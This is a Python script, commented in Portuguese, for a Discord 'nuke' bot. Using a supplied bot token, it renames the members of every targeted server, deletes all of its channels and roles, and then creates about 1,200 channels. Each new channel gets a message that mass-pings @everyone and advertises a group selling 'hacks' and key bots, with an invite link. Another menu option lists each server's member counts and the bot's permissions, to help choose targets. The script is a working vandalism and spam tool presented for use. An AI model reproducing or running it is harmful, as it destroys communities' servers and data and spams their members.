import discord
from discord.ext import commands
from colorama import init, Fore as cc
from os import name as os_name, system
from sys import exit
import asyncio
import time

# Inicialização do Colorama
init()

# Cores do Colorama
dr = R = cc.LIGHTRED_EX
g = G = cc.LIGHTGREEN_EX
b = B = cc.LIGHTBLUE_EX
m = M = cc.LIGHTMAGENTA_EX
c = C = cc.LIGHTCYAN_EX
y = Y = cc.LIGHTYELLOW_EX
w = W = cc.RESET

# Função para limpar o terminal
clear = lambda: system('cls') if os_name == 'nt' else system('clear')

# Função personalizada para entrada
def _input(text):
    print(text, end='')
    return input()

# Banner decorado
banner = f'''
{R}██████╗     ██╗  ██╗
{R}██╔══██╗    ██║ ██╔╝
{R}██║  ██║    █████╔╝ 
{R}██║  ██║    ██╔═██╗ 
{R}██████╔╝    ██║  ██╗
{R}╚═════╝     ╚═╝  ╚═╝
{Y}Feito por: {G}Menor dk 🇾🇪
'''

# Função para exibir menu com animação
def show_menu():
    clear()
    menu = f'''
{banner}
{C}--------------------------------------------
{B}[Menu]
{Y}1 - {G}Executar Setup Nuke Bot
{Y}2 - {G}Sair
{Y}3 - {G}Parar
{Y}4 - {G}Ver Servidores do Bot
{C}--------------------------------------------
'''
    print(menu)

# Função para exibir opções de ataque
def show_attack_options():
    clear()
    options = f'''
{banner}
{C}--------------------------------------------
{B}[Selecione]
{Y}1 - {G}Nuke de todos os servidores.
{Y}2 - {G}Nuke apenas um servidor.
{Y}3 - {G}Sair
{C}--------------------------------------------
'''
    print(options)

async def delete_all_channel(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            continue

async def delete_all_roles(guild):
    for role in guild.roles:
        try:
            await role.delete()
        except:
            continue

async def rename_all_members(guild, name):
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.edit(nick=f'{name} ({member.name})')
            except:
                continue

async def create_text_channels(guild, name, message):
    for _ in range(10):  # Cria 10 canais por vez
        try:
            channel = await guild.create_text_channel(name=name)
            await channel.send(message)  # Envia mensagem no canal criado
        except:
            continue

async def nuke_guild(guild, name, message):
    # Renomeia membros
    await rename_all_members(guild, name)
    
    # Deleta canais
    await delete_all_channel(guild)
    
    # Deleta roles
    await delete_all_roles(guild)
    
    # Cria canais de texto
    created_channels = 0
    while created_channels < 1199:
        await create_text_channels(guild, name, message)
        created_channels += 10
        time.sleep(0.555)  # Atraso para evitar problemas

async def main():
    while True:
        show_menu()
        choice = _input('Escolha uma opção: ')
        
        if choice == '1':
            token = _input(f'{Y}Insira o token do bot:{G}')
            name = _input(f'{Y}Insira o nome para os canal/nomes:{G}')
            message = '''# DKZIN 🔥🥋🇾🇪
> - TERCEIRO COMANDO DA CAPITAL NA ATIVA,  ENTREM PRA TROPA E SEJAM FELIZES 👑
- https://discord.com/invite/gZSx3n8Csa

> TEMOS OTIMOS HACKS E METHODOS 
> BOTS DE KEY E MUITO MAIS

@here @everyone'''
            
            show_attack_options()
            choice_type = _input(f'{Y}Escolha o tipo de ataque:{G}')
            
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            if choice_type == '1':
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '2':
                guild_id = _input(f'{Y}Insira o id do servidor:{G}')
                @client.event
                async def on_ready():
                    for guild in client.guilds:
                        if str(guild.id) == guild_id:
                            await nuke_guild(guild, name, message)
                    await client.close()
            
            elif choice_type == '3':
                exit()
            
            try:
                await client.start(token)
                _input('Nuke concluído, pressione Enter para voltar ao menu...')
            except Exception as error:
                _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
        
        elif choice == '2':
            exit()
        
        elif choice == '3':
            clear()
            _input(f'{dr}Bot Parado... Pressione Enter para voltar ao menu...')
        
        elif choice == '4':
            token = _input(f'{Y}Insira o token do bot:{G}')
            client = commands.Bot(command_prefix='.', intents=discord.Intents.all())
            
            @client.event
            async def on_ready():
                clear()
                for guild in client.guilds:
                    print(f'{R}Servidor: {M}{guild.name}')
                    print(f'{C}ID: {G}{guild.id}')
                    print(f'{B}Membros: {G}{len(guild.members)}')
                    print(f'{Y}Canais: {G}{len(guild.channels)}')
                    print(f'{M}Roles: {G}{len(guild.roles)}')
                    perms = guild.me.guild_permissions
                    print(f'{W}Permissões:')
                    print(f'  {C}KICK_MEMBERS: {G}{perms.kick_members}')
                    print(f'  {C}BAN_MEMBERS: {G}{perms.ban_members}')
                    print(f'  {C}MANAGE_CHANNELS: {G}{perms.manage_channels}')
                    print(f'  {C}MANAGE_ROLES: {G}{perms.manage_roles}')
                    print(f'  {C}ADMINISTRATOR: {G}{perms.administrator}')
                    print(f'{C}--------------------------------------------')
                await client.close()
            
            try:
                await client.start(token)
                _input('Pressione Enter para voltar ao menu...')
            except Exception as error:
                _input(f'{R}{error}\n{B}Pressione Enter para voltar...')
        
        else:
            _input(f'{R}Opção inválida. Pressione Enter para voltar...')

# Executa o menu principal
if __name__ == "__main__":
    asyncio.run(main())
